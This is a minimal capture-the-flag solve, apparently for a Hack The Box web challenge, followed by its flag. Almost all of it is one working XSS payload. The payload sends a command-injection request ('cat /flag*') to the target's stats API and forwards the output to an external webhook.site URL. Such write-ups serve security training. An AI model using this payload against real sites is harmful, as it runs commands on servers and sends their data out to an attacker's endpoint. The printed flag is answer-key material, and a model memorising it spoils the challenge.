# Source:

# Solve

Payload:
```html
<script>fetch('/api/stats?command=cat%20/flag*')
.then(data=>data.text())
.then(data=>fetch(`https://webhook.site/2d801f2b-8074-4cf5-bea6-b7d949f70598?a=${data}`));</script>
```

`Flag: HTB{th3_tr34t_m1s5i0n}`